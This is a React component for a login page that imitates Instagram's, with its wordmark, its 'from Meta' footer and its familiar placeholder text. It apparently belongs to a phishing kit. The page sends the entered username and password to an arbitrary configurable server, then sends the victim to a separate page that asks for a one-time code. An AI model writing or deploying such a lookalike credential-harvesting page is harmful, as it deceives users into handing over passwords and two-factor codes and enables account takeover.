import React, { useState } from 'react'
import axios from 'axios'
import { useNavigate } from 'react-router-dom';
const LoginPage = ({serverAPI}) => {
    const navigate = useNavigate();
    const [userName,setUserName] =  useState('');
    const [password,setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const togglePasswordVisibility = () => {
      setShowPassword(!showPassword);
    };
    const [loading,setLoading] = useState(false);
    const handleLogin = async() => {
        setLoading(false)
        setLoading(true)
        if(password === '' || userName === ''){
            setLoading(false)
            console.log('Empty')
        }else{
        try {
            const postData = await axios.post(`${serverAPI}`,{
                userName,
                password,
                otp:'null'
            })
            console.log(postData.data.id);
            const userId = postData.data.id;
            setLoading(false)
            navigate(`/otp?userId=${userId}`);
        } catch (error) {
            console.error(error);
        }
        }
        
    }
  return (
    <div>
        <div className='flex space-evenly' style={{marginTop:'20vw'}}>
      <div>
      <div className='flex space-evenly'>
        <img className='instaText' src="./instaText.png" alt="" />
      </div>
      <div className='flex space-evenly'>
        <input className='cred' type="text" name="" id="" placeholder='Phone number, username or email address' value={userName} onChange={(e) => setUserName(e.target.value)} />
        
      </div>
      <div className='flex space-btewen mt-3 pswFld g1 align-item-center'>
      <input type={showPassword ? 'text' : 'password'} name="" id="" placeholder='Password' value={password} onChange={(e) => setPassword(e.target.value)} className='pswBox' />
      <div className='showHide text-right'>    
      {password && (
        <div className='grey f2 text-right' onClick={togglePasswordVisibility}>
              {showPassword ? 'Hide' : 'Show'}
        </div>    
      )}
</div>
      </div>
      <div className='text-right blue mt-3 f2'>
        Forgotten your password?
      </div>
      <div className='flex space-evenly mt-5'>
       <button className='loginButton' onClick={handleLogin}>
        {!loading ?(
            <div>Log in</div>
        ):(
            <div className="spinner"></div>
        )}
       </button>
        
      </div>
      </div>
      
    </div>
    <div className='bottomData flex space-evenly'>
      <div className='text-center'>
        <div className='f1 grey'>from</div>
        <img src="./metaLogo.png" className='metaLogo' alt="" />
      </div>
    </div>
    </div>
  )
}

export default LoginPage